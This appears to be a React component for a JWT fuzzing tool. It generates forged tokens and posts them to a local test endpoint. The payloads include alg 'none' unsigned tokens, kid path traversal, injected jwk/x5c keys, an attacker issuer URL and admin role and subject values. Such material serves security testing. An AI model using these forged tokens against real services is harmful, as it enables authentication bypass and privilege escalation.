import React, { useState } from 'react';
import { Card, Button, Alert, ProgressBar, Table, Badge } from 'react-bootstrap';
import axios from 'axios';

const TokenFuzzer = ({ token }) => {
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState([]);
  const [error, setError] = useState(null);

  // Common payloads for different claim types
  const fuzzingPayloads = {
    sub: [
      'admin',
      'administrator',
      'root',
      'system',
      '1',
      '-1',
      'null',
      '{"admin": true}',
      '*'
    ],
    role: [
      'admin',
      'administrator',
      'superuser',
      'system',
      '["admin"]',
      '{"admin": true}',
      '*',
      'admin*',
      '%00admin'
    ],
    iss: [
      'http://attacker.com',
      'https://legitimate-site.com',
      'null',
      '../',
      '\\\\attacker.com',
      '*'
    ],
    exp: [
      '999999999999',
      '-1',
      '0',
      'null',
      'undefined',
      String(Date.now() + 86400000)
    ],
    iat: [
      '0',
      '-1',
      String(Date.now()),
      'null',
      String(Date.now() - 86400000)
    ]
  };

  const generateFuzzedTokens = (originalToken) => {
    try {
      // Decode the original token
      const [headerB64, payloadB64] = originalToken.split('.');
      const header = JSON.parse(atob(headerB64));
      const payload = JSON.parse(atob(payloadB64));
      const fuzzedTokens = [];

      // Generate fuzzing variations for each claim in the payload
      Object.keys(payload).forEach(claim => {
        if (fuzzingPayloads[claim]) {
          fuzzingPayloads[claim].forEach(fuzzValue => {
            const fuzzedPayload = { ...payload };
            fuzzedPayload[claim] = fuzzValue;
            
            fuzzedTokens.push({
              claim,
              value: fuzzValue,
              payload: fuzzedPayload,
              header: { ...header }
            });
          });
        }
      });

      // Add header fuzzing variations
      const headerVariations = [
        { alg: 'none' },
        { alg: 'HS256', kid: '../../../dev/null' },
        { alg: 'RS256', jwk: { kty: 'RSA', e: 'AQAB', n: 'xyz', kid: 'attacker-key' } },
        { alg: 'RS256', x5c: ['attacker-cert'] }
      ];

      headerVariations.forEach(headerMod => {
        fuzzedTokens.push({
          claim: 'header',
          value: JSON.stringify(headerMod),
          payload: { ...payload },
          header: { ...header, ...headerMod }
        });
      });

      return fuzzedTokens;
    } catch (e) {
      throw new Error('Failed to decode token: ' + e.message);
    }
  };

  const fuzzToken = async () => {
    setLoading(true);
    setError(null);
    setResults([]);
    setProgress(0);

    try {
      const fuzzedTokens = generateFuzzedTokens(token);
      const results = [];
      let completed = 0;

      for (const fuzzed of fuzzedTokens) {
        try {
          // Create the fuzzed token
          const headerEncoded = btoa(JSON.stringify(fuzzed.header)).replace(/=/g, '');
          const payloadEncoded = btoa(JSON.stringify(fuzzed.payload)).replace(/=/g, '');
          const fuzzedToken = `${headerEncoded}.${payloadEncoded}.`;

          // Test the fuzzed token
          const response = await axios.post('http://localhost:8000/test', {
            token: fuzzedToken
          });

          results.push({
            claim: fuzzed.claim,
            value: fuzzed.value,
            token: fuzzedToken,
            result: response.data.success ? 'success' : 'failure',
            details: response.data
          });
        } catch (err) {
          results.push({
            claim: fuzzed.claim,
            value: fuzzed.value,
            result: 'error',
            error: err.message
          });
        }

        completed++;
        setProgress(Math.floor((completed / fuzzedTokens.length) * 100));
      }

      setResults(results);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <Card>
        <Card.Header>Token Fuzzer</Card.Header>
        <Card.Body>
          <p>
            Automatically generate and test token variations using common payload patterns
            and known vulnerabilities.
          </p>

          <Button
            variant="primary"
            onClick={fuzzToken}
            disabled={loading || !token}
          >
            {loading ? 'Fuzzing...' : 'Start Fuzzing'}
          </Button>

          {loading && (
            <div className="mt-3">
              <ProgressBar 
                animated 
                now={progress} 
                label={`${progress}%`}
              />
            </div>
          )}

          {error && (
            <Alert variant="danger" className="mt-3">
              {error}
            </Alert>
          )}

          {results.length > 0 && (
            <div className="mt-4">
              <h5>Fuzzing Results</h5>
              <Table responsive striped bordered hover>
                <thead>
                  <tr>
                    <th>Claim</th>
                    <th>Fuzzed Value</th>
                    <th>Result</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {results.map((result, index) => (
                    <tr key={index}>
                      <td>{result.claim}</td>
                      <td>
                        <code>{result.value}</code>
                      </td>
                      <td>
                        <Badge bg={
                          result.result === 'success' ? 'success' :
                          result.result === 'failure' ? 'warning' :
                          'danger'
                        }>
                          {result.result}
                        </Badge>
                      </td>
                      <td>
                        {result.token && (
                          <Button
                            variant="outline-secondary"
                            size="sm"
                            onClick={() => navigator.clipboard.writeText(result.token)}
                          >
                            Copy Token
                          </Button>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </Table>
            </div>
          )}
        </Card.Body>
      </Card>
    </div>
  );
};

export default TokenFuzzer;